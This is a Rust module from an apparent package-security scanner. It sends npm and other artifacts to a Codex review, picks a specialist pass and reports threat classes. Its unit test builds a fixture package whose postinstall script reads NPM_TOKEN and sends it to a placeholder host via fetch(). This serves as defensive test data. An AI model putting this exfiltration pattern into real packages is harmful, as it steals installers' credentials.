//! Codex-backed analysis for the exact-artifact product spine.
//!
//! This adapter deliberately has no admission authority. It invokes an
//! explicitly measured native Codex client with saved ChatGPT subscription
//! authentication, normalizes structurally cited findings locally, and treats
//! every no-finding result as inconclusive.

use crate::{
    BoundOptionalEvidenceOutcomeV1, BoundOptionalEvidenceV1, ExactArtifactAdapterRequestV1,
    ExactArtifactAiAdapterV1, ExactArtifactOptionalResultV1, ExactArtifactScenarioPlanV1,
    OptionalAdapterErrorV1, PreparedArtifact,
};
use std::path::PathBuf;
use std::time::Duration;
use whoathere_artifact::Sha256Digest;
use whoathere_artifact_review_runtime::{
    hosted_cli_provider_identity_v2, ArtifactAiProviderKindV2, ArtifactAiProviderV2,
    ArtifactReviewCancellationTokenV2, AuthorizedHostedCliProviderV2, HostedCliRuntimePolicyV2,
};
use whoathere_detector::{
    artifact_review_adapter_result_schema_sha256_v2, artifact_review_prompt_template_sha256_v2,
    build_artifact_review_request_v2, normalize_artifact_review_provider_outputs_v2,
    ArtifactFindingCategory, ArtifactReviewConfigV2, ArtifactReviewContextKindV2,
    ArtifactReviewInferenceSettingsV2, ArtifactReviewModelIdentityV2, ArtifactReviewPassV2,
    ArtifactReviewPrivacyPostureV2, ArtifactReviewPromptIdentityV2, ArtifactReviewRequestV2,
    ArtifactReviewThreatClassV2, ArtifactReviewVerdictV2, ArtifactReviewWorkItemV2,
    ArtifactStaticAnalysis, SourceLanguage, ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2,
    ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2,
};

pub const EXACT_ARTIFACT_CODEX_PROVIDER_ID_V1: &str = "codex";

/// Explicit configuration for one subscription-backed Codex review.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExactArtifactCodexAiConfigV1 {
    pub client_path: PathBuf,
    pub client_sha256: Sha256Digest,
    pub model: String,
    pub authentication_home: PathBuf,
    pub runtime_root: PathBuf,
    pub timeout: Duration,
}

/// Observe-only Codex adapter for `artifact inspect`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExactArtifactCodexAiAdapterV1 {
    config: ExactArtifactCodexAiConfigV1,
}

impl ExactArtifactCodexAiAdapterV1 {
    pub fn new(config: ExactArtifactCodexAiConfigV1) -> Result<Self, OptionalAdapterErrorV1> {
        if !config.client_path.is_absolute()
            || !config.authentication_home.is_absolute()
            || !config.runtime_root.is_absolute()
            || config.model.is_empty()
            || config.model.len() > 256
            || config.model.eq_ignore_ascii_case("latest")
            || config.model.to_ascii_lowercase().ends_with(":latest")
            || config.timeout.is_zero()
            || config.timeout > Duration::from_secs(10 * 60)
        {
            return Err(OptionalAdapterErrorV1::new(
                "exact_artifact_codex_config_invalid",
            ));
        }
        Ok(Self { config })
    }
}

impl ExactArtifactAiAdapterV1 for ExactArtifactCodexAiAdapterV1 {
    fn provider_id(&self) -> &str {
        EXACT_ARTIFACT_CODEX_PROVIDER_ID_V1
    }

    fn readiness_reason(&self) -> Option<&'static str> {
        None
    }

    fn analyze(
        &self,
        adapter_request: &ExactArtifactAdapterRequestV1,
        prepared: &PreparedArtifact,
        deterministic: &ArtifactStaticAnalysis,
        _scenarios: &ExactArtifactScenarioPlanV1,
    ) -> Result<BoundOptionalEvidenceV1, OptionalAdapterErrorV1> {
        let review_request = build_artifact_review_request_v2(
            prepared.evidence_subject(),
            prepared.normalized(),
            deterministic,
            ArtifactReviewConfigV2 {
                policy_sha256: Sha256Digest::from_bytes(
                    format!(
                        "whoathere.exact_artifact.codex_review.v1\0{}\0{}\0{}",
                        adapter_request.request_sha256,
                        self.config.client_sha256,
                        self.config.model
                    )
                    .as_bytes(),
                ),
                provider: hosted_cli_provider_identity_v2(ArtifactAiProviderKindV2::Codex),
                model: ArtifactReviewModelIdentityV2::hosted_opaque(
                    self.config.model.clone(),
                    "provider-hosted-opaque-version",
                ),
                prompt: ArtifactReviewPromptIdentityV2 {
                    template_id: ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2.to_string(),
                    template_version: ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2.to_string(),
                    template_sha256: artifact_review_prompt_template_sha256_v2(),
                },
                adapter_result_schema_sha256: artifact_review_adapter_result_schema_sha256_v2(),
                privacy_posture: ArtifactReviewPrivacyPostureV2::ApprovedHosted,
                inference: ArtifactReviewInferenceSettingsV2 {
                    seed: 0,
                    temperature_milli: 0,
                    top_p_milli: 1_000,
                    context_tokens: 16_384,
                    max_output_tokens: 2_048,
                },
            },
        )
        .map_err(|_| OptionalAdapterErrorV1::new("exact_artifact_codex_request_failed"))?;

        if review_request.work_items().is_empty() {
            return optional_result(
                adapter_request,
                BoundOptionalEvidenceOutcomeV1::Incomplete,
                vec!["exact_artifact_codex_no_reviewable_content".to_string()],
            );
        }

        let authorization = AuthorizedHostedCliProviderV2::new_codex_subscription(
            &review_request,
            self.config.client_path.clone(),
            self.config.client_sha256.clone(),
        )
        .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let policy = HostedCliRuntimePolicyV2::new(
            self.config.runtime_root.clone(),
            self.config.authentication_home.clone(),
            self.config.timeout,
            Duration::from_millis(500),
        )
        .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let cancellation = ArtifactReviewCancellationTokenV2::new();
        let specialist_pass = preferred_specialist_pass(deterministic);
        let selected_work_item = select_mvp_work_item(&review_request, specialist_pass)
            .ok_or_else(|| {
                OptionalAdapterErrorV1::new("exact_artifact_codex_no_reviewable_content")
            })?;
        let outcome = authorization
            .invoke(
                &review_request,
                prepared.normalized(),
                selected_work_item.work_item_id(),
                &policy,
                &cancellation,
            )
            .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let receipt_sha256 = outcome
            .receipt()
            .receipt_sha256()
            .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
        let output = outcome.into_parts().0;
        let normalization = normalize_artifact_review_provider_outputs_v2(
            prepared.evidence_subject(),
            prepared.normalized(),
            deterministic,
            &review_request,
            std::slice::from_ref(&output),
        )
        .map_err(|_| OptionalAdapterErrorV1::new("exact_artifact_codex_output_invalid"))?;

        let result = normalization.structurally_validated_result();
        let mut reasons = vec![
            "exact_artifact_codex_coverage_incomplete".to_string(),
            "exact_artifact_codex_hosted_provider_opaque".to_string(),
            "exact_artifact_codex_mvp_single_work_item".to_string(),
            "exact_artifact_codex_no_admission_authority".to_string(),
            format!(
                "exact_artifact_codex_receipt_sha256:{}",
                receipt_sha256.as_str().trim_start_matches("sha256:")
            ),
        ];
        for finding in result.findings() {
            reasons.push(format!(
                "exact_artifact_codex_threat_class:{}",
                threat_class_reason(finding.threat_class())
            ));
        }

        let outcome = match result.verdict() {
            ArtifactReviewVerdictV2::Suspicious => {
                reasons.push("exact_artifact_codex_suspicious_finding".to_string());
                BoundOptionalEvidenceOutcomeV1::FindingsWithIncompleteCoverage
            }
            ArtifactReviewVerdictV2::NoFinding | ArtifactReviewVerdictV2::Uncertain => {
                reasons.push("exact_artifact_codex_no_finding_inconclusive".to_string());
                BoundOptionalEvidenceOutcomeV1::Incomplete
            }
        };
        optional_result(adapter_request, outcome, reasons)
    }
}

fn preferred_specialist_pass(analysis: &ArtifactStaticAnalysis) -> ArtifactReviewPassV2 {
    let has_category = |categories: &[ArtifactFindingCategory]| {
        analysis
            .findings
            .iter()
            .any(|finding| categories.contains(&finding.category))
    };
    if has_category(&[
        ArtifactFindingCategory::CredentialAccess,
        ArtifactFindingCategory::SensitivePathAccess,
        ArtifactFindingCategory::CredentialExfiltrationCapability,
        ArtifactFindingCategory::SensitiveFileExfiltrationCapability,
    ]) {
        ArtifactReviewPassV2::CredentialFilesystem
    } else if has_category(&[
        ArtifactFindingCategory::NetworkCapability,
        ArtifactFindingCategory::EnvironmentExfiltrationCapability,
    ]) {
        ArtifactReviewPassV2::NetworkExfiltration
    } else if has_category(&[
        ArtifactFindingCategory::ProcessExecution,
        ArtifactFindingCategory::DownloadExecuteCapability,
        ArtifactFindingCategory::EnvironmentToProcessCapability,
    ]) {
        ArtifactReviewPassV2::ProcessExecution
    } else if has_category(&[ArtifactFindingCategory::EnvironmentAccess]) {
        ArtifactReviewPassV2::EnvironmentGating
    } else {
        ArtifactReviewPassV2::Trigger
    }
}

fn select_mvp_work_item(
    request: &ArtifactReviewRequestV2,
    specialist_pass: ArtifactReviewPassV2,
) -> Option<&ArtifactReviewWorkItemV2> {
    let trigger_surface_file = |item: &&ArtifactReviewWorkItemV2, executable_only: bool| {
        item.pass() == specialist_pass
            && request.coverage().files().iter().any(|file| {
                file.file_id() == item.file_id()
                    && (!executable_only || executable_source_language(file.language()))
                    && file.contexts().iter().any(|context| {
                        context.kind() == ArtifactReviewContextKindV2::TriggerSurface
                    })
            })
    };
    request
        .work_items()
        .iter()
        .find(|item| trigger_surface_file(item, true))
        .or_else(|| {
            request
                .work_items()
                .iter()
                .find(|item| trigger_surface_file(item, false))
        })
        .or_else(|| {
            request
                .work_items()
                .iter()
                .find(|item| item.pass() == specialist_pass)
        })
        .or_else(|| request.work_items().first())
}

fn executable_source_language(language: SourceLanguage) -> bool {
    matches!(
        language,
        SourceLanguage::Javascript
            | SourceLanguage::Typescript
            | SourceLanguage::Python
            | SourceLanguage::Shell
            | SourceLanguage::Pth
    )
}

fn optional_result(
    adapter_request: &ExactArtifactAdapterRequestV1,
    outcome: BoundOptionalEvidenceOutcomeV1,
    reasons: Vec<String>,
) -> Result<BoundOptionalEvidenceV1, OptionalAdapterErrorV1> {
    ExactArtifactOptionalResultV1::new(adapter_request.request_sha256.clone(), outcome, reasons)
        .and_then(|result| result.to_canonical_json_bytes())
        .map(|canonical_result_bytes| BoundOptionalEvidenceV1 {
            canonical_result_bytes,
        })
}

fn threat_class_reason(threat_class: ArtifactReviewThreatClassV2) -> &'static str {
    match threat_class {
        ArtifactReviewThreatClassV2::CredentialAndSensitiveFileDiscovery => {
            "credential_and_sensitive_file_discovery"
        }
        ArtifactReviewThreatClassV2::NetworkExfiltrationAndMetadataAccess => {
            "network_exfiltration_and_metadata_access"
        }
        ArtifactReviewThreatClassV2::SecondStageNativeOrWasmHandoff => {
            "second_stage_native_or_wasm_handoff"
        }
        ArtifactReviewThreatClassV2::ProcessShellOrDynamicLoading => {
            "process_shell_or_dynamic_loading"
        }
        ArtifactReviewThreatClassV2::ObfuscationPackingOrStringConstruction => {
            "obfuscation_packing_or_string_construction"
        }
        ArtifactReviewThreatClassV2::EnvironmentOrDelayedGating => "environment_or_delayed_gating",
        ArtifactReviewThreatClassV2::PersistenceDestructionOrSelfDeletion => {
            "persistence_destruction_or_self_deletion"
        }
        ArtifactReviewThreatClassV2::RepositoryWorkflowPublicationOrPropagation => {
            "repository_workflow_publication_or_propagation"
        }
        ArtifactReviewThreatClassV2::DependencyIndirectionConfusionOrTransitiveCompromise => {
            "dependency_indirection_confusion_or_transitive_compromise"
        }
        ArtifactReviewThreatClassV2::ImportOrUseTimeTampering => "import_or_use_time_tampering",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Cursor;
    use whoathere_artifact::{
        normalize_artifact, AcquisitionMethod, ArtifactEnvelope, ArtifactEnvelopeInput,
        ArtifactFormat, ArtifactSourceType, Ecosystem, NormalizationLimits,
    };
    use whoathere_detector::analyze_normalized_artifact;
    use whoathere_evidence::v2::{
        canonical_cas_object_key_for_artifact, ArtifactEvidenceSubjectV2,
    };

    fn npm_tarball(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let encoder = GzEncoder::new(Vec::new(), Compression::default());
        let mut archive = tar::Builder::new(encoder);
        for (path, bytes) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_entry_type(tar::EntryType::Regular);
            header.set_size(bytes.len() as u64);
            header.set_mode(0o644);
            header.set_uid(0);
            header.set_gid(0);
            header.set_mtime(0);
            header.set_cksum();
            archive
                .append_data(&mut header, *path, Cursor::new(*bytes))
                .expect("append inert npm member");
        }
        archive
            .into_inner()
            .expect("finish tar")
            .finish()
            .expect("finish gzip")
    }

    #[test]
    fn mvp_selection_uses_credential_specialist_on_postinstall_javascript() {
        let bytes = npm_tarball(&[
            (
                "package/package.json",
                br#"{"name":"selection-fixture","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
            ),
            (
                "package/install.js",
                b"const token = process.env.NPM_TOKEN; fetch('https://example.invalid/' + token);\n",
            ),
        ]);
        let envelope = ArtifactEnvelope::from_original_bytes(
            ArtifactEnvelopeInput {
                ecosystem: Ecosystem::Npm,
                package_name: Some("selection-fixture".to_string()),
                package_version: Some("1.0.0".to_string()),
                source_coordinate: "fixture:selection-fixture@1.0.0".to_string(),
                source_type: ArtifactSourceType::LocalFile,
                acquired_at: "2026-07-15T00:00:00Z".to_string(),
                acquisition_method: AcquisitionMethod::LocalInertFixture,
                original_filename: "selection-fixture-1.0.0.tgz".to_string(),
                declared_format: Some(ArtifactFormat::NpmTarGzip),
                custody_reference: "inert-selection-fixture".to_string(),
                resolver_metadata_sha256: None,
                registry_metadata_sha256: None,
                policy_version: "exact-artifact-codex-selection-test.v1".to_string(),
                requires_external_dependency_resolution: false,
            },
            &bytes,
            ArtifactFormat::NpmTarGzip,
        );
        let artifact = normalize_artifact(&envelope, &bytes, NormalizationLimits::default())
            .expect("normalize npm fixture");
        let analysis = analyze_normalized_artifact(&artifact).expect("analyze npm fixture");
        let artifact_sha256 = artifact.manifest.artifact_sha256.as_str();
        let subject = ArtifactEvidenceSubjectV2::new(
            artifact_sha256,
            Sha256Digest::from_bytes(b"selection fixture envelope").to_string(),
            artifact.manifest.manifest_sha256.to_string(),
            canonical_cas_object_key_for_artifact(artifact_sha256).expect("canonical CAS key"),
        )
        .expect("evidence subject");
        let request = build_artifact_review_request_v2(
            &subject,
            &artifact,
            &analysis,
            ArtifactReviewConfigV2 {
                policy_sha256: Sha256Digest::from_bytes(b"selection fixture policy"),
                provider: hosted_cli_provider_identity_v2(ArtifactAiProviderKindV2::Codex),
                model: ArtifactReviewModelIdentityV2::hosted_opaque(
                    "gpt-selection-fixture",
                    "provider-hosted-opaque-version",
                ),
                prompt: ArtifactReviewPromptIdentityV2 {
                    template_id: ARTIFACT_REVIEW_PROMPT_TEMPLATE_ID_V2.to_string(),
                    template_version: ARTIFACT_REVIEW_PROMPT_TEMPLATE_VERSION_V2.to_string(),
                    template_sha256: artifact_review_prompt_template_sha256_v2(),
                },
                adapter_result_schema_sha256: artifact_review_adapter_result_schema_sha256_v2(),
                privacy_posture: ArtifactReviewPrivacyPostureV2::ApprovedHosted,
                inference: ArtifactReviewInferenceSettingsV2 {
                    seed: 0,
                    temperature_milli: 0,
                    top_p_milli: 1_000,
                    context_tokens: 16_384,
                    max_output_tokens: 2_048,
                },
            },
        )
        .expect("build review request");

        assert!(request.work_items().iter().any(|item| {
            item.pass() == ArtifactReviewPassV2::CredentialFilesystem
                && request.coverage().files().iter().any(|file| {
                    file.file_id() == item.file_id()
                        && file.language() == SourceLanguage::JsonMetadata
                        && file.contexts().iter().any(|context| {
                            context.kind() == ArtifactReviewContextKindV2::TriggerSurface
                        })
                })
        }));
        assert!(analysis.findings.iter().any(|finding| {
            finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
        }));
        let specialist_pass = preferred_specialist_pass(&analysis);
        assert_eq!(specialist_pass, ArtifactReviewPassV2::CredentialFilesystem);
        let selected = select_mvp_work_item(&request, specialist_pass).expect("selected work item");
        let selected_language = request
            .coverage()
            .files()
            .iter()
            .find(|file| file.file_id() == selected.file_id())
            .map(|file| file.language())
            .expect("selected file coverage");
        assert_eq!(selected.pass(), ArtifactReviewPassV2::CredentialFilesystem);
        assert_eq!(selected_language, SourceLanguage::Javascript);
    }
}
